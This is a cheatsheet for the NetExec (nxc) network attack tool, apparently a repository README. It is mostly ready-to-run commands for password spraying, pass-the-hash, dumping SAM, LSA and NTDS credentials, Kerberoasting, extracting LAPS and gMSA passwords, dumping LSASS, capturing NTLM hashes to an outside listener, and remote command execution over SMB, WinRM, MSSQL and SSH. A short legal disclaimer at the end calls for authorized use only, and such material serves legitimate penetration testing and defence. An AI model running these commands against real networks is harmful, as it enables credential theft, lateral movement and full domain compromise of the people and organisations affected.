# ⚡ NetExec (nxc) - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```

<p align="center">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME Successor">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Network Pentesting">
</p>

<p align="center">
  <b>🌐 The official, community-driven successor to CrackMapExec for network and Active Directory exploitation</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Why NetExec over CrackMapExec?](#-why-netexec-over-crackmapexec)
- [Installation](#-installation)
- [Supported Protocols](#-supported-protocols)
- [SMB Exploitation](#-smb-exploitation)
  - [Reconnaissance & Share Enumeration](#reconnaissance--share-enumeration)
  - [Password Spraying & Credential Testing](#password-spraying--credential-testing)
  - [Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Credential Dumping (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Command Execution](#command-execution)
- [LDAP Exploitation](#-ldap-exploitation)
  - [Domain Enumeration & Password Policy](#domain-enumeration--password-policy)
  - [AS-REP Roasting & Kerberoasting](#as-rep-roasting--kerberoasting)
  - [LAPS & gMSA Extraction](#laps--gmsa-extraction)
  - [BloodHound Data Ingestion](#bloodhound-data-ingestion)
- [MSSQL Exploitation](#-mssql-exploitation)
- [WinRM, RDP & SSH Modules](#-winrm-rdp--ssh-modules)
- [Popular NetExec Modules (`-M`)](#-popular-netexec-modules--m)
- [Workspaces & Built-in Database](#-workspaces--built-in-database)
- [Quick Reference Table](#-quick-reference-table)
- [Tips & Best Practices](#-tips--best-practices)
- [Legal Disclaimer](#-legal-disclaimer)
- [Resources](#-resources)

---

## 🎯 Introduction

**NetExec** (`nxc`) is a multi-purpose post-exploitation tool designed to automate assessing large Active Directory and Windows networks. It is the official, active community fork and continuation of **CrackMapExec** (CME), created after CME was retired and archived by its original author.

NetExec acts as a network "Swiss Army knife," interfacing seamlessly with SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP, and VNC to automate authentication, credential dumping, vulnerability checks, and lateral movement.

---

## ⚖️ Why NetExec over CrackMapExec?

| Feature | CrackMapExec (CME) | NetExec (nxc) |
|---------|--------------------|---------------|
| **Development Status** | 🛑 Archived / Deprecated | 🟢 Actively Maintained |
| **Python Support** | Legacy (Python 3.8-3.10) | Modern Python 3.10+ |
| **Protocol Support** | SMB, LDAP, MSSQL, WinRM, SSH | + VNC, FTP, RDP, WMI enhancements |
| **BloodHound Support** | BloodHound Legacy only | BloodHound CE & Legacy |
| **Kerberos & PKINIT** | Limited | Robust PKINIT & Kerberos ticket support |
| **Bug Fixes & Modules** | Frozen | Constantly updated CVE and exploit modules |

---

## 📥 Installation

### Using pipx (Recommended)

```bash
pipx install netexec
```

### Kali Linux

NetExec is the official replacement for CrackMapExec in Kali:

```bash
sudo apt update && sudo apt install -y netexec
```

### Docker

```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```

### Verification

```bash
nxc --version
```

---

## 🔌 Supported Protocols

NetExec accepts the target protocol as its primary argument:

```bash
nxc <protocol> <target(s)> [options]
```

- `nxc smb` - Server Message Block (shares, SAM/LSA/NTDS dumping, command exec)
- `nxc ldap` - Lightweight Directory Access Protocol (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (database queries, xp_cmdshell, impersonation)
- `nxc winrm` - Windows Remote Management (stealthy command execution)
- `nxc rdp` - Remote Desktop Protocol (auth verification, screenshots)
- `nxc ssh` - Secure Shell (Linux/UNIX credential testing & exec)
- `nxc ftp` / `nxc vnc` - File Transfer & Virtual Network Computing

---

## 🛡️ SMB Exploitation

### Reconnaissance & Share Enumeration

```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```

### Password Spraying & Credential Testing

```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```

### Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)

```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```

### Credential Dumping (SAM, LSA, NTDS)

```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```

### Command Execution

```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```

---

## 🌳 LDAP Exploitation

### Domain Enumeration & Password Policy

```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```

### AS-REP Roasting & Kerberoasting

```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```

### LAPS & gMSA Extraction

```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```

### BloodHound Data Ingestion

```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```

---

## 🗄️ MSSQL Exploitation

```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```

---

## 🚀 WinRM, RDP & SSH Modules

### WinRM Command Execution
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```

### RDP Screenshotting & Auth
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```

### SSH Spraying & Commands
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```

---

## 🧩 Popular NetExec Modules (`-M`)

| Module | Protocol | Description | Example |
|--------|----------|-------------|---------|
| `spooler` | SMB | Check if Print Spooler service is running (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | SMB | Check for CVE-2020-1472 vulnerability | `nxc smb <IP> -M zerologon` |
| `nopac` | SMB | Check for CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | SMB | Check if host is vulnerable to PetitPotam coercion | `nxc smb <IP> -M petitpotam` |
| `nanodump` | SMB | Dump LSASS memory minidump stealthily using nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | SMB | Check if WebClient service is active for WebDAV relay | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | Dump LAPS passwords for workstations | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Extract Group Managed Service Account secrets | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Workspaces & Built-in Database

NetExec automatically records all discovered hosts, valid credentials, and dumped hashes into a local SQLite database (`~/.nxc/workspaces/`):

```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```

---

## 📊 Quick Reference Table

| Task | Protocol | Command |
|------|----------|---------|
| **Enumerate Shares** | SMB | `nxc smb <IP> -u '' -p '' --shares` |
| **Check Pass Policy** | SMB | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Password Spray** | SMB | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Pass the Hash** | SMB | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Dump SAM** | SMB | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Dump NTDS** | SMB | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **AS-REP Roasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **BloodHound Dump** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Tips & Best Practices

1. **Always Check Password Policy First:**
   Before launching any password spray, always run `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` to inspect `Account Lockout Threshold`. If it's set to 3 or 5, spray only once every 30+ minutes to avoid locking domain accounts.
2. **Use `--local-auth` for Workstations:**
   When testing local admin credentials across workstations instead of domain credentials, always include the `--local-auth` flag.
3. **Pivoting Integration:**
   NetExec works seamlessly over SOCKS proxies (e.g. `proxychains nxc smb ...`) or over Ligolo-ng TUN interfaces with native speed!

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** NetExec is an offensive security assessment tool. It must strictly be used on computer networks and domain infrastructure where you have acquired explicit, documented authorization.

---

## 📚 Resources

- [NetExec Official GitHub Repository](https://github.com/Pennyw0rth/NetExec)
- [Official NetExec Documentation](https://www.netexec.wiki/)
